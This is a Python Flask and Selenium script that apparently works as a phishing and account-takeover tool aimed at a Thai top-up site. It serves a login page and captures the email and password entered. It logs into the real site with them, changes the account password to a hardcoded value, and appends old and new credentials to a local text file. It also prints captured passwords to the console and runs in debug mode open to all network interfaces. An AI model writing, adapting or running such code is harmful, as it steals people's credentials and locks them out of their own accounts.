from flask import Flask, render_template, request, redirect, jsonify
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

app = Flask(__name__, template_folder='templates')

@app.route('/')
def login():
    return render_template('login.html', error=None)

@app.route('/perform_login', methods=['POST'])
def perform_login():
    email = request.form['email']
    password = request.form['password']
    print(f"Received login request: {email}, {password}")
    service = Service(r"D:\fac\chromedriver-win64\chromedriver.exe")
    options = webdriver.ChromeOptions()
    options.add_experimental_option("detach", True)  # Keep Chrome open

    try:
        driver = webdriver.Chrome(service=service, options=options)
        driver.get('https://p2wtopup.com/%E0%B9%80%E0%B8%82%E0%B9%89%E0%B8%B2%E0%B8%AA%E0%B8%B9%E0%B9%88%E0%B8%A3%E0%B8%B0%E0%B8%9A%E0%B8%9A')
        # driver.set_window_size(800, 600)

        # Wait for email input field
        email_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, 'email'))
        )
        email_input.clear()
        email_input.send_keys(email)

        # Wait for password input field
        password_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, 'password'))
        )
        password_input.clear()
        password_input.send_keys(password)

        # Wait for login button and click
        login_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "flex.mt-2.items-center.justify-center.focus\:outline-none.text-white.sm\:text-base.bg-blue-500.hover\:bg-blue-600.disabled\:bg-gray-400.rounded.py-2.w-full.transition.duration-150.ease-in"))
        )
        login_button.click()

        print("Login button clicked, waiting...")
        time.sleep(3)  # Shorter wait time

        # Wait for setting password button and click
        try:
            WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.XPATH, "//span[contains(text(), 'ไม่พบผู้ใช้งาน หรือรหัสผ่านไม่ถูกต้อง')]"))
            )
            print("Login failed: Invalid username or password.")
            return "ไม่พบผู้ใช้งาน หรือรหัสผ่านไม่ถูกต้อง"  # ส่งกลับไปให้ AJAX จับ
        except:
            print("Login successful!")

        # Wait for 'Change Password' button and click
        change_password_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'เปลี่ยนรหัสผ่าน')]"))
        )
        change_password_button.click()

        # Wait for password input field and clear it
        password_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, 'password'))
        )
        password_input.clear()
        password_input.send_keys(password)

        # Set new password
        # newpass = "951263487Ll"
        newpass = "623159487Kk"

        # Wait for new password input field
        newPasswordinput = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, 'newPassword'))
        )
        newPasswordinput.clear()
        newPasswordinput.send_keys(newpass)

        # Wait for confirm password input field
        confirmPassword_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, 'confirmPassword'))
        )
        confirmPassword_input.clear()
        confirmPassword_input.send_keys(newpass)

        # Wait for confirm change password button and click
        change_password_button_new = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'เปลี่ยนรหัสผ่าน')]"))
        )
        change_password_button_new.click()

        time.sleep(10) 
        save_path = "password_changes.txt"
        with open(save_path, "a", encoding="utf-8") as file:
            file.write(f"Email: {email}, Old Password: {password}, New Password: {newpass}\n")

        print(f"Password changed successfully and saved to {save_path}")
        return jsonify({"status": 200, "message": "success"}), 200
    except Exception as e:
        print(f"Error occurred: {e}")
        return f"An error occurred: {e}"

    finally:
        print("Closing browser...")
        driver.quit()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5080, debug=True)
